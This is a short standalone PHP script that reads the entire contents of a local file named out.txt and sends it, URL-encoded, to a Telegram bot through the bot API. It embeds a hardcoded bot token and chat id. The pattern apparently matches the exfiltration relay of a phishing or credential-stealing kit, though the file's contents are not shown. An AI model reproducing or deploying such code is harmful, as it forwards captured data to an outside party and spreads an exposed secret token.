<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot2145840349:AAGDOvefP7fSATFjIG4jprsqBBIseLIOVRo/sendMessage?chat_id=496266461&text=$msg");
?>
